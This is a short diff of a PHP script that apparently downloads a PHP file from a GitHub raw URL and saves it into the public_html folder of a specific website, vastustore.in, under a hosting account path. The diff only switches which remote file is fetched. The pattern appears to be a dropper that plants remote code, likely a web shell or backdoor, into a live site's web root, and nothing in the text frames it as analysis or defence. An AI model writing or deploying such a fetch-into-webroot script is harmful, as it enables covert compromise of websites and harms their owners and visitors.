@@ -1,6 +1,6 @@
 <?php
 // URL file dari GitHub raw
-$url = "https://raw.githubusercontent.com/Bayyzp/ntah/refs/heads/main/apalah.php";
+$url = "https://raw.githubusercontent.com/Bayyzp/ntah/refs/heads/main/index.php";
 
 // Lokasi penyimpanan full path (bukan pakai $_SERVER['DOCUMENT_ROOT'])
 $savePath = "/home/u977259636/domains/vastustore.in/public_html/apalah.php";
